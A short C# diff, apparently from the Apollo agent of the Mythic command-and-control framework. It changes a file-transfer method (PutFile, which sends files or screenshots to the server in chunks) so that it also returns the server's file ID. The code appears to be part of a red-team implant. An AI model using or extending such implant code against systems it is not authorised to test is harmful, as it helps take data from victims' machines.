@@ -130,7 +130,7 @@ namespace Apollo.Management.Files
             }
         }
 
-        public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, bool isScreenshot = false, string originatingHost = null)
+        public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
         {
             string uuid = Guid.NewGuid().ToString();
             lock (_downloadMessageStore)
@@ -162,6 +162,7 @@ namespace Apollo.Management.Files
                 ct.WaitHandle
             });
             _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
+            mythicFileId = itemTracker.FileID;
             return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
         }
 
